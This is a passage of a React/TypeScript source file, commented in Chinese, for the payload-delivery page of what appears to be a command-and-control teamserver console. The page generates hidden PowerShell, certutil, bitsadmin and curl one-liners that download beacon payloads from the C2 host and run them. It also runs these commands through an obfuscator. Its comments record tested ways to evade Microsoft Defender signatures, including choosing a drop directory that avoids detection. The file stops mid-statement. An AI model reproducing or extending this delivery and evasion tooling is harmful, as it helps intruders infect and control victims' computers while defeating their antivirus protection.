import { useEffect, useMemo, useRef, useState } from 'react'
import { useStore } from '../store'
import { t } from '../i18n'
import { AGENT_PROFILES, defaultAgentConfig } from '../api/listeners'
import { copyText } from '../utils'
import { PageTips } from './PageTips'

type Status = {
  script_route?: string
  payload_route?: string
  listener?: string
  agent_name?: string
  format?: string
  arch?: string
  cache_entries?: number
  c2_host_url?: string
  sleep?: string
  jitter?: number
  cache_ttl_min?: number
}

function joinUrl(base: string, route: string) {
  const b = (base || '').replace(/\/+$/, '')
  const r = route.startsWith('/') ? route : `/${route}`
  return `${b}${r}`
}

/**
 * 「C2 Host URL」（目标机访问 teamserver 的地址，含 /api）的缺省值。
 *
 * ★ 这里原本在 apiBase 为空或相对时回退到写死的 'https://上游作者的IP:8080/api' —— 上游
 *   作者自己的机器。而同源部署下 apiBase 恰恰就是空的（ApiClient 拿到 ''），于是这一栏
 *   开箱即填着别人的地址，投递出去的一行命令会指向那台机器。
 *
 * 正确做法是补成**绝对 URL**：控制台本身就是从这台 teamserver 上取来的，所以「目标机该
 * 访问哪个 API 地址」的答案就是当前页面的 origin + /api。服务端侧对同一件事另有兜底
 * （webdelivery 的 publicBaseURL() 在 c2_host_url 为空时按请求 Host 反推），但出厂
 * config.yaml 把它填死了 ⇒ 那条兜底永远不生效，见 doc §6.20 的登记。
 */
function defaultC2Host(apiBase: string) {
  try {
    return new URL(apiBase || '/api', window.location.origin).toString().replace(/\/+$/, '')
  } catch {
    return ''
  }
}

/**
 * 值里带不带单位（5s / 3m / 500ms）。
 *
 * 只用来分「时长」和「秒数」两类参数，不做数值合法性校验 —— 它唯一的用武之地是
 * 切 Agent 时判断旧值还属不属于新 agent（见下面的校正 effect）。
 */
function hasUnit(v: string) {
  return /[a-z]/i.test(String(v).trim())
}

/**
 * 某个 agent 的参数语义：这一格是「时长」（Sleep）还是「秒数」（重连间隔），以及它自己的默认值。
 *
 * 真值只有一处 —— defaultAgentConfig。判断依据是它给没给 sleep 字段：
 *   beacon / kharon        → { sleep: '5s' | '3s', jitter }       → 时长
 *   linux / macos / gopher → { reconn_timeout: '10', ... }         → 秒数
 *
 * 抽成函数是因为有两个地方要问同一件事：渲染时（标签/占位符）和归一化时（切 Agent、
 * 拉到服务端配置）。分散写就会变成两处真值。
 */
function sleepSpecFor(agent: string, format: string, arch: string) {
  const d = defaultAgentConfig(agent, format, arch)
  const kind: 'sleep' | 'reconn' = 'sleep' in d ? 'sleep' : 'reconn'
  return { kind, def: String((kind === 'sleep' ? d.sleep : d.reconn_timeout) ?? '10') }
}

/**
 * 从兼容监听里挑一个默认项，按名字排序后取第一个。
 *
 * 不能直接取 compatible[0]：那个顺序来自 store 里 listeners 记录的插入顺序
 * （Object.values），是按服务端返回 / WS 到达顺序攒出来的。实测同一个会话里
 * 两次打开投递页，自动选中的是两个不同的监听（见 shots/opts-linux.png 前后两版）。
 * 操作员看到的默认选中值不该随消息到达顺序变 —— 尤其是它决定「应用并同步」写哪个监听。
 *
 * 按名字排是确定的，且不引入别的判断（比如"优先选在 Listen 的"）——
 * 那是行为选择，得先确认符合操作习惯，不能顺手替人定。
 */
function pickDefaultListener<T extends { l_name: string }>(list: T[]): T {
  return [...list].sort((a, b) => a.l_name.localeCompare(b.l_name))[0]
}

/* ── 参数混淆（argfuscator）接入 ────────────────────────────────────────────
 *
 * 下面这三条约束**全部来自实测**（2026-09-19 测、2026-09-20 登记在 doc §6.23），不是照上游
 * 文档推的。每一条都对应一个「不这么写就一定坏、而且坏得看不出来」的点：
 *
 *  1. 上游拿**第一个词**去查 models/<词>.json，而 models/ 里**没有 cmd.json**
 *     ⇒ `cmd /c "…"` 整体送进去必然报「命令找不到」。所以只把**被包装的那条命令**
 *     （certutil / bitsadmin / curl）送去混淆，`cmd /c "…"` 外壳与后面的
 *     `&& start /b "" …` 都留在本地、不参与混淆。三条直拉类拆开后
 *     certutil / bitsadmin / curl 三个模型都在表里，各出 5 个变体。
 *
 *  2. ★★ 真正会坏的地方是 **`%VAR%`**，不是引号 —— 这一条推翻了上一版的判据。
 *     混淆器会往变量引用**内部**插字符（实测把 `%TEMP%` 插成 `%TE"M"P%`），
 *     而 cmd 的变量展开发生在**去引号之前**，这个引用于是不成立，curl 拿着
 *     字面路径去写：`Failed to open the file %TEMP%//aB3.eXe`（rc=23），
 *     载荷一个字节都没下来。
 *     ⇒ **输出路径必须留在混淆区之外**（见 `WinEntry.post`）。改完之后实测
 *     `%USERPROFILE%` 展开 **15/15**。
 *     引号本身无害：同一批 30 条变体套外层引号 0/15 坏、不套 0/15 坏；
 *     `certutil`/`bitsadmin` 拼接形态 5/5 + 5/5 通过。⇒ **不再按引号过滤**。
 *
 *  3. ★★ 更隐蔽的一种坏法：变体是个**语法正确、语义不同**的 URL。实测 curl#5 的
 *     路径被改成 `/api/delivebr/payload`（`deliver` 里多插了一个 `b`）—— curl
 *     照常发请求，只是 404。不校验的话操作员拿到的是「看起来正常」的坏命令。
 *     ⇒ 逐条比对 **URL 归一化后的 scheme/host/port/path**（见 `obfVariantIssue`）。
 *     归一化必须做：混淆器**故意**把 IP 换成整数形态（`0x09ac6a222`）、把路径
 *     改写成带 `../` 的样子（实测 #1~#4 全是这种，且**全部真下到了载荷**），
 *     按字面比会把这四条好的一起误判成坏的。
 *
 *  4. 插件对上游返回值**零校验**（`pl_main.go:401-411` 只去空行），坏变体照发。
 *     ⇒ 校验只能在前端做，而且**只标注、不静默丢弃** —— 实测 15 条里坏 1 条，
 *     丢掉它等于把「生成了 5 条」说成「生成了 4 条」，操作员再也看不见风险长什么样。
 *
 * 收益是有 A/B 支撑的：同一 URL、同一条 `certutil -urlcache -split -f …`，
 * 明文 3/3 被 Defender 按命令行签名拦下（`Trojan:Win32/Ceprolad.A`，
 * `Path: CmdLine:_cmd.exe /c certutil …`，载荷一个字节都没下来），
 * 同命令的 5 个混淆变体 5/5 跑起来了。端到端也验过：curl 那条 **4/5 真下到了
 * 76312B 的 x64 载荷**。⚠ 但 PS iex 那一族**两组都没被检测**，
 * 混淆在 PS 路径上的收益本轮**没测出来**，别当成已证。
 *
 * ⚠ certutil / bitsadmin **过不了自签证书**，与混淆无关：实测明文就是
 * `0x80072F8F (ERROR_WINHTTP_SECURE_FAILURE)` / `0x80072F0D`，两者都没有
 * 「跳过校验」开关，而 teamserver 的 38212 只有 HTTPS（明文 HTTP 得到的是
 * `400 Client sent an HTTP request to an HTTPS server`）。这两条仅当证书受信时可用。
 */

/* ── 载荷落地目录 ──────────────────────────────────────────────────────────
 *
 * ★★ 不能用 `%TEMP%`。2026-09-20 实测：`Trojan:Win32/Commando.A!ml`（命令行 ML，
 * ThreatID 2147840094）拦的是「**`.exe` 落在 `%TEMP%`** × **随后被 `start` 执行**」
 * 这个**合取**，**与 URL 长什么样无关** —— 干净 URL 一样拦。
 * （这条推翻了同日早些时候「URL 里成串 `../` 穿越才是触发点」的结论，那是 n=1 的假象。）
 *
 * 证据是**交错 A/B**：同一循环、同一秒、只有落点不同 ——
 *     `%TEMP%`        拦 8/10
 *     `%USERPROFILE%` 拦 0/10
 * 更硬的是 Defender 自己的检测账：全场 13 条 Commando 检测，**13/13 落点都是 `%TEMP%`**；
 * 非 `%TEMP%` 落点约 50 次运行 0 条。三因素缺一即放行：`%TEMP%`+`.bin` 过、
 * `%TEMP%`+`.exe`+`&& echo` 过、别处+`.exe`+`&& start` 过。
 *
 * ⚠ 只影响 cmd 落点的三条直拉命令（certutil / bitsadmin / curl）；PS 那三条不走落盘。
 * ⚠ 整个路径必须留在 `post` 段、不进 `core` —— `%VAR%` 被混淆器拆散是实测到的头号坏因
 *   （见文件头第 2 条）。换目录时别把它挪进混淆区。
 * ⚠ 也别换成 `C:\Users\Public`、`C:\temp` 这类教科书 payload 落点。
 */
const WIN_DROP_DIR = '%USERPROFILE%'

/** 与后端 `firstToken` 同一口径：按空白切第一个词。 */
function firstToken(s: string): string {
  return s.trim().split(/\s+/)[0] || ''
}

/** IPv4 的点分 / 十进制 / `0x` 十六进制三种写法归一成点分；认不出来就小写原样。
 *
 *  必须归一：实测混淆器会把主机换成 IP 的整数形态（`0x09ac6a222`、`2596708898`
 *  都是 154.198.162.34），那是**语义等价**的改写，不是「主机被改坏」。
 *  按字面比会把这类好变体误报成坏的。 */
function obfNormHost(h: string): string {
  const s = h.toLowerCase()
  let n: number
  if (/^0x[0-9a-f]+$/.test(s)) n = parseInt(s.slice(2), 16)
  else if (/^\d+$/.test(s)) n = parseInt(s, 10)
  else return s
  if (!Number.isFinite(n) || n < 0 || n > 0xffffffff) return s
  return [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.')
}

/** 按 `..` 归一化路径。
 *
 *  同样必须归一：混淆器**故意**把路径改写成带 `../` 的样子来伪装（实测
 *  `winsxs/../temp/../api/…/deliver/update/../payload`），归一化后与原路径相同
 *  就是语义相同 —— 那几条实测都真下到了载荷。多出来的 `..` 按 URL 规范丢弃。 */
function obfNormPath(p: string): string {
  const out: string[] = []
  for (const seg of (p || '/').split('/')) {
    if (seg === '' || seg === '.') continue
    if (seg === '..') { out.pop(); continue }
    out.push(seg)
  }
  return '/' + out.join('/')
}

function parseObfUrl(s: string) {
  const m = /^(https?):\/\/([^/?#]+)([^?#]*)/.exec(s)
  if (!m) return null
  const [host, port = ''] = m[2].split(':')
  return { scheme: m[1], host: obfNormHost(host), port, path: obfNormPath(m[3]) }
}

/**
 * 变体可用性判据 —— 三条**全部来自实测**，不是「含特殊字符就危险」的启发式。
 *
 * 返回 `''` 表示没查出问题；否则返回人类可读的原因，由界面标在那一条上。
 *
 * 为什么是「标注」而不是「过滤」：实测 15 条变体里坏 1 条，丢掉那一条等于把
 * 「生成了 5 条」说成「生成了 4 条」—— 操作员再也看不见风险长什么样，下次
 * 换个命令遇到同类问题还是不知道。标出来 + 说明原因，比替他扔掉有用。
 */
function obfVariantIssue(core: string, v: string): string {
  // 换行在 cmd 里就是第二条命令；在 PS 里是多一条语句。两种落点都不该有。
  if (/[\r\n]/.test(v)) return '含换行，粘进命令行会变成第二条命令'

  const wantRaw = core.match(/https?:\/\/\S+/)?.[0]
  if (!wantRaw) return ''
  // 变体里的引号是混淆器插进去的字面量，先摘掉再取 URL（引号本身实测无害）
  const gotRaw = v.replace(/["']/g, '').match(/https?:\/\/\S+/)?.[0]
  if (!gotRaw) return '变体里找不到 URL'
  const want = parseObfUrl(wantRaw)
  const got = parseObfUrl(gotRaw)
  if (!want || !got) return '变体的 URL 解析不了'
  if (want.scheme !== got.scheme) return `协议被改成 ${got.scheme}`
  if (want.host !== got.host) return `主机被改成 ${got.host}（原 ${want.host}）`
  if (want.port !== got.port) return `端口被改成 ${got.port}（原 ${want.port}）`
  if (want.path !== got.path) return `路径被改成 ${got.path}（原 ${want.path}）`

  // 变量引用：core 里本该一个 % 都没有（输出路径在 post 段），冒出来就是被拆坏的
  if (v.includes('%') && !core.includes('%'))
    return '掺入了 %：经 cmd 会和后面 %TEMP% 的那个 % 配成一对，把中间一段吞掉'
  return ''
}

/**
 * 一条 Windows 投递命令。
 *
 * `core` 是送去混淆的那一段（第一个词必须在服务端模型表里），`tail` 是接在
 * 后面、原样保留的部分。分成两段而不是拿正则去拆整行 —— 拆的那版一旦上游改了
 * `&&` 的写法就会静默拆错，而错的结果是一条看起来正常的坏命令。
 */
type WinEntry = {
  id: string
  label: string
  /** toast 里用的短名（原来那几条 ' certutil' / ' PS/cmd' 就是它） */
  short: string
  /**
   * 送去混淆的那一段，第一个词必须在服务端模型表里。
   *
   * ★ 这里**不能出现 `%VAR%`** —— 变量引用被拆散是实测到的头号坏因（见文件头
   * 第 2 条）。所以输出路径一律放 `post`，不在这一段里。
   */
  core: string
  /** 接在变体后面、**不参与混淆**的一段。`%USERPROFILE%` 放在这里才保证原样展开。 */
  post: string
  /** 再往后，原样保留（`&& start /b "" …` 之类）。 */
  tail: string
  /** cmd = 经 cmd.exe 解析（变体逐条过 obfVariantIssue）
   *  ps  = 贴进 PowerShell / Win+R 执行 */
  landing: 'cmd' | 'ps'
  /** 与混淆无关的工具限制，常驻显示（如 certutil 过不了自签证书）。 */
  warn?: string
}

/** 不混淆时展示、复制的完整命令。 */
function entryCommand(e: WinEntry) {
  const body = `${e.core}${e.post}${e.tail ? ' ' + e.tail : ''}`
  return e.landing === 'cmd' ? `cmd /c "${body}"` : body
}

/** 变体的最终形态：把不参与混淆的 post 与 tail 接回去，外壳与本条原命令一致。 */
function variantCommand(e: WinEntry, v: string) {
  const body = `${v}${e.post}${e.tail ? ' ' + e.tail : ''}`
  return e.landing === 'cmd' ? `cmd /c "${body}"` : body
}

/** 混淆结果。'loading' 单独取值，避免和「有结果但为空」混淆。
 *  `issues` 与 `variants` **等长**：`''` = 没查出问题，否则是被标出来的原因。 */
type AxfDone = { variants: string[]; issues: string[]; ms: number | null; err: string }

/**
 * 一条投递命令。
 *
 * 拆出来是因为原来这十块是十份几乎一样的五行 JSX，每份都是
 * 「label / textarea / 整行宽的复制按钮」竖着叠 —— 光复制按钮就占了十条
 * 满宽横条，把右栏撑得很长，而命令本身只有一行。
 * 现在标签和复制按钮同一行、命令独占一行：
 *
 *   PowerShell · cmd / 运行（推荐）              [复制]
 *   ┌──────────────────────────────────────────────┐
 *   │ powershell -nop -w hidden -c "..."           │
 *   └──────────────────────────────────────────────┘
 *
 * 用 .field-flat 而非默认的 .field：`.field` 是 `100px 1fr` 两列网格，
 * 标签在左占 100px，在 280px 的右栏里等于直接砍掉四成宽度 ——
 * 命令框实测只有 140px 宽。
 */
function shortProto(reg?: string): string {
  const s = String(reg || '').trim()
  if (!s) return '-'
  return s.replace(/^(?:Beacon|Kharon|Gopher|Linux|Macos)/i, '') || s
}

function DeliveryEmblem() {
  return (
    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" aria-hidden="true">
      <circle cx="8" cy="8" r="2.1" fill="currentColor" />
      <path d="M4.8 4.8a4.5 4.5 0 0 0 0 6.4M11.2 4.8a4.5 4.5 0 0 1 0 6.4" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" />
      <path d="M2.6 2.6a7.6 7.6 0 0 0 0 10.8M13.4 2.6a7.6 7.6 0 0 1 0 10.8" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round" opacity="0.65" />
    </svg>
  )
}

function renderHighlightedCmd(cmd: string) {
  const tokRe = /(https?:\/\/[^\s'"]+|powershell|cmd(?=\s)|certutil|bitsadmin|curl|wget|python3|bash|%[A-Z0-9_]+%|-[A-Za-z0-9.-]+|\/(?:c|transfer|download|priority)\b)/gi
  const parts: Array<{ text: string; kind: 'str' | 'cmd' | 'url' | 'flag' | 'var' }> = []
  let last = 0
  let m: RegExpExecArray | null
  while ((m = tokRe.exec(cmd)) !== null) {
    if (m.index > last) {
      parts.push({ text: cmd.slice(last, m.index), kind: 'str' })
    }
    const val = m[0]
    const low = val.toLowerCase()
    const kind = low.startsWith('http://') || low.startsWith('https://')
      ? 'url'
      : val.startsWith('%') && val.endsWith('%')
        ? 'var'
        : val.startsWith('-') || val.startsWith('/')
          ? 'flag'
          : 'cmd'
    parts.push({ text: val, kind })
    last = m.index + val.length
  }
  if (last < cmd.length) {
    parts.push({ text: cmd.slice(last), kind: 'str' })
  }
  return parts.map((p, i) => (
    p.kind === 'str'
      ? <span key={i}>{p.text}</span>
      : <span key={i} className={`st-tok-${p.kind}`}>{p.text}</span>
  ))
}

function AxfVariantsBox({
  axf,
}: {
  axf: {
    landing: 'cmd' | 'ps'
    state?: 'loading' | AxfDone
    disabled: boolean
    disabledReason: string
    onRun: () => void
    onCopyVariant: (v: string, i: number) => void
    finalText: (v: string) => string
  }
}) {
  const [variantsOpen, setVariantsOpen] = useState(true)
  const axfRef = useRef<HTMLDivElement>(null)

  const loading = axf.state === 'loading'
  const done = axf.state && axf.state !== 'loading' ? axf.state : null
  const prevBusy = useRef(false)
  useEffect(() => {
    if (prevBusy.current && done) {
      setVariantsOpen(true)
      requestAnimationFrame(() => axfRef.current?.scrollIntoView({ behavior: 'smooth', block: 'nearest' }))
    }
    prevBusy.current = !!loading
  }, [loading, done])

  if (!done) return null
  return (
    <div className="ax-axf-box" ref={axfRef}>
      {done.err ? (
        <div className="ax-warn-callout" style={{ margin: 0 }}>{done.err}</div>
      ) : done.variants.length === 0 ? (
        <div className="ax-warn-callout" style={{ margin: 0 }}>{t('服务端没有返回任何变体')}</div>
      ) : (
        <>
          <div className="ax-axf-hd">
            <span>
              ArgFuscator · {done.variants.length} 个变体
              {done.issues.some(Boolean)
                ? ` · ${done.issues.filter(Boolean).length} 个已标注风险`
                : ' · 逐条校验通过'}
              {done.ms !== null ? ` · ${done.ms} ms` : ''}
            </span>
            <button
              type="button"
              className="ax-btn-ghost ax-btn-sm"
              onClick={() => setVariantsOpen((v) => !v)}
            >
              {variantsOpen ? '收起变体' : `展开变体 (${done.variants.length})`}
            </button>
          </div>
          {variantsOpen && (
            <>
              {done.issues.some(Boolean) && (
                <div className="ax-warn-callout" style={{ margin: 0 }}>
                  标红变体可能被改坏 URL 路径段，请勿直接复制标红变体。
                </div>
              )}
              <div className="ax-axf-list">
                {done.variants.map((v, i) => (
                  <div className={`ax-axf-item ${done.issues[i] ? 'bad' : ''}`} key={i}>
                    <div className="ax-axf-item-hd">
                      <span className="mono">#{i + 1}</span>
                      {done.issues[i] && <span className="ax-pill warn" style={{ height: 18 }}>{t('有风险')}</span>}
                      <span style={{ flex: 1 }} />
                      <button type="button" className="ax-btn ax-btn-sm" onClick={() => axf.onCopyVariant(v, i)}>{t('复制')}</button>
                    </div>
                    {done.issues[i] && <div className="ax-warn-callout" style={{ margin: 0 }}>{done.issues[i]}</div>}
                    <pre className="ax-axf-cmd mono">{renderHighlightedCmd(axf.finalText(v))}</pre>
                  </div>
                ))}
              </div>
            </>
          )}
        </>
      )}
    </div>
  )
}

export function WebDelivery({ onClose }: { onClose?: () => void } = {}) {
  const listeners = useStore((s) => s.listeners) || {}
  const api = useStore((s) => s.api)
  const pushLog = useStore((s) => s.pushLog)
  const pushToast = useStore((s) => s.pushToast)
  const setTab = useStore((s) => s.setTab)
  const openUiTab = useStore((s) => s.openUiTab)

  const listenerList = useMemo(() => Object.values(listeners), [listeners])

  const [scriptRoute, setScriptRoute] = useState('/deliver')
  const [payloadRoute, setPayloadRoute] = useState('/deliver/payload')
  const [listener, setListener] = useState('')
  const [agentName, setAgentName] = useState('beacon')
  const [format, setFormat] = useState('Exe')
  const [arch, setArch] = useState('') // empty = auto from UA
  const [sleep, setSleep] = useState('5s')
  const [jitter, setJitter] = useState(20)
  const [cacheTtl, setCacheTtl] = useState(30)
  const [c2Host, setC2Host] = useState(() => defaultC2Host(api.baseUrl || ''))
  const [busy, setBusy] = useState(false)
  const [loaded, setLoaded] = useState(false)
  const [pluginMissing, setPluginMissing] = useState(false)
  const [statusText, setStatusText] = useState('拉取服务端状态…')
  const [methodOs, setMethodOs] = useState<'win' | 'unix'>('win')
  const [winMethod, setWinMethod] = useState<'ps' | 'certutil' | 'bitsadmin' | 'curl'>('ps')
  const [psVariant, setPsVariant] = useState<'ps-cmd' | 'ps-native' | 'ps-iwr'>('ps-cmd')
  const [unixMethod, setUnixMethod] = useState<'lin-curl' | 'lin-wget' | 'lin-direct' | 'lin-py'>('lin-curl')
  const [copiedKey, setCopiedKey] = useState('')
  const [showTechNotes, setShowTechNotes] = useState(false)
  const [serverSnap, setServerSnap] = useState<{
    scriptRoute: string
    payloadRoute: string
    listener: string
    agentName: string
    format: string
    arch: string
    sleep: string
    jitter: number
    cacheTtl: number
    c2Host: string
    cacheEntries: number
  } | null>(null)
  const copyTimer = useRef<number | null>(null)
  // 每拉到一份服务端配置就 +1。它只有一个用途：让上面那个归一化 effect 再跑一次
  // （服务端快照里的值可能和当前 agent 不匹配，见那个 effect 的注释）。
  const [serverSeq, setServerSeq] = useState(0)

  // —— 参数混淆：插件状态 + 每条命令各自的变体 ——
  // 插件状态只拉一次（它不是随投递配置变的），拉不到就把按钮禁用并说明原因，
  // 而不是让操作员点了才吃一句报错。
  const [axfMeta, setAxfMeta] = useState<{ ready: boolean; reason: string; cmds: Set<string>; n: number }>(
    { ready: false, reason: '正在读取参数混淆插件状态…', cmds: new Set(), n: 5 },
  )
  const [axfState, setAxfState] = useState<Record<string, 'loading' | AxfDone>>({})

  const profile = AGENT_PROFILES.find((p) => p.agent === agentName) || AGENT_PROFILES[0]
  const formats = profile.formats
  const arches = profile.arches

  // 当前 agent 的参数语义（时长 / 秒数）与默认值，供标签、占位符和归一化共用。
  // 只在下面这个 effect 里校正、不在输入时强转，所以派生值放在渲染里是安全的。
  const sleepSpec = sleepSpecFor(agentName, format, arch || profile.arches[0])

  // 只显示与当前 agent 兼容的监听
  const compatible = useMemo(
    () => listenerList.filter((l) => profile.listeners.includes(l.l_reg_name || '')),
    [listenerList, profile],
  )

  // 这里原来有个 pickListener()：选监听时把监听名反推成 agent 并 setAgentName。
  // 已删掉，因为它把依赖箭头装反了 ——
  //
  //   agent 是【输入】，监听列表是【输出】：下面的 .gen-listener-list 渲染的是
  //   compatible，而 compatible = listenerList.filter(profile.listeners.includes)。
  //   从监听反推 agent 等于把箭头倒过来，于是必然跟用户刚点下的 Agent 打架。
  //
  // 而且那张反推表本身是错的：agentForListenerReg 是"监听类型 → agent"的一对一
  // 映射，真实关系却是多对多 —— GopherTCP 同属 linux / macos / gopher，
  // BeaconWS 同属 beacon / linux（见 api/listeners.ts 的 AGENT_PROFILES）。
  // 映射取第一个命中的分支，所以 GopherTCP 一律判成 gopher、BeaconWS 一律判成
  // beacon，恰好错在这两个共用的监听上。
  //
  // 实测（scripts/probe_picklistener.mjs，服务端只建了 TestWSS/TestWS 两个
  // BeaconWS 监听）：点「Linux Agent」→ compatible 变化触发下面这个 effect 自动
  // 选中 TestWSS → 反推得 beacon ≠ linux → agent 被顶回 Beacon，用户的点击当场
  // 失效。点 gopher 监听那一路同理（GopherTCP → gopher，顶掉 linux 和 macos）。
  //
  // 删干净而不是加判断：compatible 已经保证列表里每一项都跟当前 agent 兼容，
  // 所以"不兼容才改 agent"这种兜底永远不会触发，留着只是给下一个人埋雷。
  // 依赖里必须带 listener —— 这个 effect 是「不变量」的维护者，不是「compatible 变了
  // 才跑一次的补丁」。
  //
  // 原来只依赖 compatible，于是只要有人在 compatible 不变的情况下写进一个无效值，
  // 就再也没机会被纠正。applyStatus 干的正是这件事：它把服务端存的 listener 原样
  // 灌进 state，而库里存的是 "http" —— 投递插件早期的监听类型，根本不是监听器名。
  //
  // 实测（scripts/probe_listenersel.mjs）：刚进投递页 listener="http"，渲染出的两个
  // 兼容监听 TestWS/TestWSS 一个都没高亮，右栏摘要却写着「监听 http」，而
  // 「应用并同步」是**可点的**。点一下任一 Agent（compatible 变了）才会被顺手纠正，
  // 所以是"有时好有时不好"，最难查的那种。
  //
  // 带上 listener 之后：谁写的都无所谓，下一个 commit 一定回到不变量上。不会死循环 ——
  // 用户点选和上面自动选中的都是 compatible 里的项，再跑一次即 no-op。
  useEffect(() => {
    if (!compatible.length) {
      if (listener) setListener('')
      return
    }
    if (!compatible.find((l) => l.l_name === listener)) {
      setListener(pickDefaultListener(compatible).l_name)
    }
  }, [compatible, listener])

  // 切 Agent、或每次拉到服务端配置之后，把参数校到「这个 agent 说得通」的值。
  //
  // 线上实测（scripts/probe_delivery_options.mjs）：Linux Agent 的
  // 「Reconnect timeout / count 相关」栏里坐着 beacon 的 "5s"，而它自己的占位符写着 10。
  // 原因是 sleep 从头到尾只有一个 state，切 agent 没人管它 —— beacon 的 5s 就这么
  // 一路带到了 linux / gopher 的重连间隔里，然后被当作 sleep 发给服务端。
  //
  // 为什么依赖里要有 serverSeq：applyStatus 会把服务端存的 sleep 原样灌回来，
  // 而它同时也会 setAgentName —— 如果只依赖 agentName，那"服务端存的就是当前 agent"
  // 这种情况（agent_name 没变）就一次都不会校正：实测点一下「刷新状态」，
  // linux 的重连栏又会坐回服务端的 "5s"。所以每次拿到新快照都要重新归一化一次。
  //
  // 判据只比"带不带单位"：时长（5s/3m）属于 Sleep，纯数字属于秒数。
  // 故意**不**依赖 sleep：依赖了就会在用户敲到一半时把 "5" 改掉。
  // 代价是它只在"agent 换了"和"拿到服务端快照"这两个会让旧值失效的时刻跑，
  // 而这两个正是全部时刻。
  useEffect(() => {
    if (!formats.includes(format)) {
      setFormat(agentName === 'beacon' ? (formats.includes('Exe') ? 'Exe' : formats[0]) : formats[0])
    }
    const wantsUnit = sleepSpec.kind === 'sleep'
    if (hasUnit(sleep) !== wantsUnit) setSleep(sleepSpec.def)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [agentName, serverSeq])

  async function loadStatus() {
    setBusy(true)
    try {
      const st = await api.webDeliveryStatus()
      setPluginMissing(false)
      applyStatus(st)
      setLoaded(true)
      // 这行报的是**服务端存着的那份配置**，不是上面表单的当前值 —— 所以显式写「服务端」。
      // 原来只写「缓存 N 条 · 监听 X · Agent Y · 格式 Z」，紧挨着表单读起来就是
      // "我选的就是这些"，而两栏摘要是另一套值，同屏自相矛盾（截图见
      // shots/opts-linux.png：表单是 Linux Agent / TestWSS / Binary ELF，
      // 这行却写着 Agent beacon · 格式 Exe · 监听 http）。
      setStatusText(
        `Server config: cache ${st.cache_entries ?? 0} · listener ${st.listener || '-'} · agent ${st.agent_name || '-'} · format ${st.format || '-'}`,
      )
    } catch (e: any) {
      const msg = e?.message || String(e)
      if (/404|not found|no route|webdelivery/i.test(msg) || /non-JSON/i.test(msg)) {
        setPluginMissing(true)
        setStatusText('WebDelivery 插件未加载或路由不可用')
      } else {
        setStatusText(`状态拉取失败: ${msg}`)
        pushLog('err', `WebDelivery status: ${msg}`)
      }
    } finally {
      setBusy(false)
    }
  }

  function applyStatus(st: Status) {
    const legacy: Record<string, string> = {
      'Artifact Go Exe': st.agent_name === 'gopher' ? 'Binary EXE' : 'Exe',
      'Artifact C++ Exe': 'Exe',
      'Artifact C++ DLL': 'DLL',
    }
    const fmt = st.format ? (legacy[st.format] || st.format) : ''
    if (st.script_route) setScriptRoute(st.script_route)
    if (st.payload_route) setPayloadRoute(st.payload_route)
    if (st.agent_name) setAgentName(st.agent_name)
    if (fmt) setFormat(fmt)
    if (st.listener) setListener(st.listener)
    if (st.c2_host_url) setC2Host(st.c2_host_url)
    if (st.sleep) setSleep(st.sleep)
    if (typeof st.jitter === 'number') setJitter(st.jitter)
    if (typeof st.cache_ttl_min === 'number') setCacheTtl(st.cache_ttl_min)
    if (typeof st.arch === 'string') setArch(st.arch || '')
    setServerSnap({
      scriptRoute: st.script_route || scriptRoute,
      payloadRoute: st.payload_route || payloadRoute,
      listener: st.listener || listener,
      agentName: st.agent_name || agentName,
      format: fmt || format,
      arch: typeof st.arch === 'string' ? st.arch : arch,
      sleep: st.sleep || sleep,
      jitter: typeof st.jitter === 'number' ? st.jitter : jitter,
      cacheTtl: typeof st.cache_ttl_min === 'number' ? st.cache_ttl_min : cacheTtl,
      c2Host: st.c2_host_url || c2Host,
      cacheEntries: st.cache_entries ?? 0,
    })
    setServerSeq((n) => n + 1)
  }

  useEffect(() => {
    loadStatus().catch(() => {})
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  // 参数混淆插件状态。判据与 ArgFuscator 页一致：路由不存在时 http.ts 抛 non-JSON
  // （有些部署下静态兜底会以 200 + HTML 应答，所以不能只看状态码）。
  // 另外把命令清单拿回来 —— 这样「第一个词不在模型表里」能在**点按钮之前**就提示，
  // 而不是让操作员等一次必然失败的往返。
  useEffect(() => {
    let alive = true
    ;(async () => {
      try {
        const st: any = await api.argFuscatorStatus()
        if (!alive) return
        if (st?.available === false) {
          setAxfMeta({
            ready: false,
            reason: `服务端没有可用的 pwsh：${st.reason || '原因未知'}`,
            cmds: new Set(),
            n: 5,
          })
          return
        }
        setAxfMeta({
          ready: true,
          reason: '',
          cmds: new Set<string>((st?.commands || []).map((c: unknown) => String(c).toLowerCase())),
          n: typeof st?.max_variants === 'number' && st.max_variants > 0 ? st.max_variants : 5,
        })
      } catch (e: any) {
        if (!alive) return
        const msg = e?.message || String(e)
        setAxfMeta({
          ready: false,
          reason:
            /404|not found|no route|argfuscator/i.test(msg) || /non-JSON/i.test(msg)
              ? '服务端未加载 argfuscator 插件，无法混淆'
              : `参数混淆插件状态拉取失败：${msg}`,
          cmds: new Set(),
          n: 5,
        })
      }
    })()
    return () => { alive = false }
  }, [api])

  const scriptUrl = useMemo(() => joinUrl(c2Host, scriptRoute), [c2Host, scriptRoute])
  const payloadUrl = useMemo(() => joinUrl(c2Host, payloadRoute), [c2Host, payloadRoute])
  // 方言强制：空 UA 的 WebClient 以前会误返 bash；PS one-liner 走 /deliver?d=ps
  const scriptPs = useMemo(() => `${scriptUrl}${scriptUrl.includes('?') ? '&' : '?'}d=ps`, [scriptUrl])
  const scriptBash = useMemo(() => `${scriptUrl}${scriptUrl.includes('?') ? '&' : '?'}d=bash`, [scriptUrl])

  // —— 产品级多入口 one-liner（参考常见 C2 投递面）——
  // Windows: PS iex / PS IWR / certutil / bitsadmin / curl.exe / mshta(仅提示)
  // *nix: curl|bash / wget|bash / python
  // 服务端 /deliver 按 UA 或 ?d= 返回脚本；/deliver/payload 按 UA 或 ?arch/?os 出对应载荷
  //
  // 六条都拆成 { core, tail, landing }：core 是能送进混淆器的那一段，tail 是接在后面
  // 原样保留的部分。三条直拉类拆开后 core 里没有引号 ⇒ 变体可以逐条过 cmd 落点校验；
  // 三条 PowerShell 的 core 自带引号 ⇒ 只标 'ps' 落点，不承诺经 cmd。
  const psPre =
